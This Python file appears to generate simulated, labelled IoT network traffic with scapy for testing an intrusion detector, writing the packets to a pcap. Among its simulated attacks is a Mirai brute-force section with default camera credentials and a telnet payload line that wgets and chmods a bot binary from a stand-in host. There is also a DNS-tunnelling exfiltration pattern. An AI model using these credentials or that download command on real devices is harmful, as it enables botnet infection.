"""Synthetic IoT network traffic with labelled attacks.

Used for the no-root demo mode, the test-suite and the evaluation script.
The traffic is *simulated*: realistic enough to exercise every detector, but
it is not a substitute for evaluating on a public dataset (see README).

Timeline (seconds, default scenario):
    0  - 60   benign traffic only (lets the ML model warm up)
    60 - 70   port scan of the camera from a compromised host
    80 - 90   Mirai telnet scanner sweeping the subnet
    95 - 110  Mirai default-credential brute force on the camera
    120 - 130 SYN flood against the thermostat
    140 - 150 UDP flood against the NVR
    160 - 175 DNS tunneling (data exfiltration) from the smart plug
    175 - 200 benign traffic only
"""

import ipaddress
import random
import string
from dataclasses import dataclass
from typing import List, Optional, Tuple

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.utils import wrpcap

NET = "192.168.1."
GATEWAY = NET + "1"
BROKER = NET + "2"
NVR = NET + "5"
CAMERA = NET + "10"
THERMOSTAT = NET + "11"
PLUG = NET + "12"
LAPTOP = NET + "20"
ATTACKER = NET + "66"
CLOUD = ["52.95.110.1", "34.117.59.81", "142.250.72.14", "104.18.32.7"]

DEVICES = [
    # ip, mac, name
    (GATEWAY, "a4:2b:b0:00:00:01", "Router / gateway"),
    (BROKER, "dc:a6:32:00:00:02", "MQTT broker (Raspberry Pi)"),
    (NVR, "00:11:32:00:00:05", "Network video recorder"),
    (CAMERA, "2c:aa:8e:00:00:10", "Smart camera"),
    (THERMOSTAT, "18:b4:30:00:00:11", "Smart thermostat"),
    (PLUG, "50:02:91:00:00:12", "Smart plug"),
    (LAPTOP, "3c:22:fb:00:00:20", "Laptop"),
    (ATTACKER, "b8:27:eb:00:00:66", "Compromised IoT device"),
]
MAC = {ip: mac for ip, mac, _ in DEVICES}

LabeledPacket = Tuple[object, str]


@dataclass
class Scenario:
    duration: float = 200.0
    attacks: bool = True
    seed: int = 7
    start_time: float = 1_700_000_000.0


class _Builder:
    def __init__(self, sc: Scenario):
        self.sc = sc
        self.rng = random.Random(sc.seed)
        self.out: List[LabeledPacket] = []

    def add(self, t: float, pkt, label: str = "normal") -> None:
        src = pkt[IP].src
        dst = pkt[IP].dst
        frame = Ether(src=MAC.get(src, "02:00:00:00:00:99"),
                      dst=MAC.get(dst, MAC[GATEWAY])) / pkt
        frame.time = self.sc.start_time + t
        self.out.append((frame, label))

    def eport(self) -> int:
        return self.rng.randint(49152, 65535)

    # ----------------------------------------------------------- benign
    def benign(self) -> None:
        r, d = self.rng, self.sc.duration
        # Camera -> NVR video stream (RTP over UDP, ~20 pkt/s)
        t = 0.0
        while t < d:
            self.add(t, IP(src=CAMERA, dst=NVR) / UDP(sport=5004, dport=5004)
                     / Raw(bytes(r.randint(900, 1300))))
            t += r.expovariate(20)
        # Thermostat + plug -> MQTT broker telemetry every ~2 s, broker acks
        for dev in (THERMOSTAT, PLUG):
            t = r.random()
            sport = self.eport()
            while t < d:
                self.add(t, IP(src=dev, dst=BROKER) / TCP(sport=sport, dport=1883, flags="PA")
                         / Raw(b"0\x1a\x00\x0chome/" + dev.encode() + b'{"temp":21.5}'))
                self.add(t + 0.004, IP(src=BROKER, dst=dev) / TCP(sport=1883, dport=sport,
                                                                 flags="A"))
                t += r.uniform(1.5, 2.5)
        # Devices: periodic DNS + HTTPS check-ins to the cloud
        for dev, host in ((CAMERA, b"api.camvendor.com"), (THERMOSTAT, b"time.nest.example"),
                          (PLUG, b"iot.plugvendor.net")):
            t = r.uniform(0, 5)
            while t < d:
                self.add(t, IP(src=dev, dst=GATEWAY) / UDP(sport=self.eport(), dport=53)
                         / DNS(rd=1, qd=DNSQR(qname=host)))
                cloud = r.choice(CLOUD)
                sp = self.eport()
                self.add(t + 0.02, IP(src=dev, dst=cloud) / TCP(sport=sp, dport=443, flags="S"))
                self.add(t + 0.05, IP(src=cloud, dst=dev) / TCP(sport=443, dport=sp, flags="SA"))
                for k in range(r.randint(3, 8)):
                    self.add(t + 0.06 + k * 0.01, IP(src=dev, dst=cloud)
                             / TCP(sport=sp, dport=443, flags="PA")
                             / Raw(bytes(r.randint(80, 600))))
                t += r.uniform(10, 20)
        # Laptop browsing: bursts of new HTTPS connections + DNS
        t = r.uniform(0, 3)
        while t < d:
            for _ in range(r.randint(2, 6)):
                name = "".join(r.choices(string.ascii_lowercase, k=r.randint(4, 10)))
                self.add(t, IP(src=LAPTOP, dst=GATEWAY) / UDP(sport=self.eport(), dport=53)
                         / DNS(rd=1, qd=DNSQR(qname=f"www.{name}.com")))
                # public first octets only (no 10/127/172/192 private or loopback ranges)
                ext = (f"{r.choice((23, 34, 52, 93, 104, 142, 151, 185))}."
                       f"{r.randint(0, 255)}.{r.randint(0, 255)}.{r.randint(1, 254)}")
                sp = self.eport()
                self.add(t + 0.03, IP(src=LAPTOP, dst=ext) / TCP(sport=sp, dport=443, flags="S"))
                self.add(t + 0.07, IP(src=ext, dst=LAPTOP) / TCP(sport=443, dport=sp, flags="SA"))
                for k in range(r.randint(5, 30)):
                    self.add(t + 0.08 + k * 0.005, IP(src=ext, dst=LAPTOP)
                             / TCP(sport=443, dport=sp, flags="A")
                             / Raw(bytes(r.randint(200, 1400))))
                t += r.uniform(0.1, 0.5)
            t += r.uniform(2, 8)

    # ----------------------------------------------------------- attacks
    def port_scan(self, start: float) -> None:
        for i, port in enumerate(self.rng.sample(range(1, 10000), 300)):
            self.add(start + i * 0.03, IP(src=ATTACKER, dst=CAMERA)
                     / TCP(sport=self.eport(), dport=port, flags="S"), "port_scan")

    def mirai_scanner(self, start: float) -> None:
        # Mirai's scanner uses seq = destination IP - its best-known fingerprint
        for i in range(120):
            dst = NET + str(self.rng.randint(2, 254))
            self.add(start + i * 0.08, IP(src=ATTACKER, dst=dst)
                     / TCP(sport=self.eport(), dport=self.rng.choice([23, 23, 23, 2323]),
                           flags="S", seq=int(ipaddress.IPv4Address(dst))), "mirai")

    def mirai_bruteforce(self, start: float) -> None:
        creds = [(b"root", b"xc3511"), (b"root", b"vizxv"), (b"admin", b"admin"),
                 (b"root", b"888888"), (b"root", b"xmhdipc"), (b"root", b"default")]
        t = start
        for user, pw in creds:
            sp = self.eport()
            self.add(t, IP(src=ATTACKER, dst=CAMERA) / TCP(sport=sp, dport=23, flags="S"),
                     "mirai")
            self.add(t + 0.2, IP(src=ATTACKER, dst=CAMERA) / TCP(sport=sp, dport=23, flags="PA")
                     / Raw(user + b"\r\n"), "mirai")
            self.add(t + 0.5, IP(src=ATTACKER, dst=CAMERA) / TCP(sport=sp, dport=23, flags="PA")
                     / Raw(pw + b"\r\n"), "mirai")
            t += 2.0
        sp = self.eport()
        for cmd in (b"enable\r\n", b"shell\r\n", b"/bin/busybox MIRAI\r\n",
                    b"cd /tmp; wget http://203.0.113.9/bins/mirai.arm7; chmod 777 mirai.arm7\r\n"):
            self.add(t, IP(src=ATTACKER, dst=CAMERA) / TCP(sport=sp, dport=23, flags="PA")
                     / Raw(cmd), "mirai")
            t += 0.3

    def syn_flood(self, start: float) -> None:
        for i in range(3000):
            self.add(start + i * (10 / 3000), IP(src=ATTACKER, dst=THERMOSTAT)
                     / TCP(sport=self.eport(), dport=80, flags="S",
                           seq=self.rng.randint(0, 2**32 - 1)), "syn_flood")

    def udp_flood(self, start: float) -> None:
        for i in range(4000):
            self.add(start + i * (10 / 4000), IP(src=ATTACKER, dst=NVR)
                     / UDP(sport=self.eport(), dport=self.rng.randint(1, 65535))
                     / Raw(bytes(512)), "udp_flood")

    def dns_tunnel(self, start: float) -> None:
        alphabet = string.ascii_lowercase + string.digits
        for i in range(60):
            chunk = "".join(self.rng.choices(alphabet, k=self.rng.randint(45, 60)))
            self.add(start + i * 0.25, IP(src=PLUG, dst=GATEWAY)
                     / UDP(sport=self.eport(), dport=53)
                     / DNS(rd=1, qd=DNSQR(qname=f"{chunk}.x7.exfil-example.net")), "dns_tunnel")


ATTACK_WINDOWS = {
    "port_scan": (60, 70), "mirai": (80, 110), "syn_flood": (120, 130),
    "udp_flood": (140, 150), "dns_tunnel": (160, 175),
}


def generate(scenario: Optional[Scenario] = None) -> List[LabeledPacket]:
    scenario = scenario or Scenario()
    b = _Builder(scenario)
    b.benign()
    if scenario.attacks:
        b.port_scan(60)
        b.mirai_scanner(80)
        b.mirai_bruteforce(95)
        b.syn_flood(120)
        b.udp_flood(140)
        b.dns_tunnel(160)
    b.out.sort(key=lambda lp: lp[0].time)
    return b.out


def write_pcap(path: str, scenario: Optional[Scenario] = None) -> int:
    packets = [p for p, _ in generate(scenario)]
    wrpcap(path, packets)
    return len(packets)
